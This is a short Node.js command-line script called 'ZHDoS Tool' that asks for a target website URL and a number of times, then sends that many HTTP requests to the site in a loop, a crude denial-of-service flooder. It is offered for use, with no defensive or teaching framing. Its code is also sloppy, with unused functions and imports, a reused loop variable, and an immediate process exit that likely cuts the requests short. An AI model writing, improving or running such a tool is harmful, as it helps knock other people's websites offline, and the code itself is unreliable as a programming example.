var request = require('request');

const { exec } = require('child_process');
const readline = require('readline-sync');

var clear = require('clear');
var server = "auto";

clear();
console.log("\nZHDoS Tool\n\n\n\n\n\nEnter You Want To DoS Site (Ex: http://www.example.com)\n");
let seturl = readline.question("");

if (seturl != "") {
	clear();
	console.log("\nZHDoS Tool\n\n\n\n\n\nEnter You Want To DoS Number of Times (Ex: 120)\n");
	let settimes = readline.question("");
	if (settimes != "") {
		
		var times = settimes;
		
		for(i=0;i<times;i++){
				function makeid(length) {
					var result           = '';
					var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
					var charactersLength = characters.length;
					for ( var i = 0; i < length; i++ ) {
						result += characters.charAt(Math.floor(Math.random() * charactersLength));
					}
					return result;
				}
					
				var curlurl = seturl;
				request({uri:seturl}, function (error, response, body) {});
				console.log(i+"/"+times);
		}
	}
}
process.exit(0);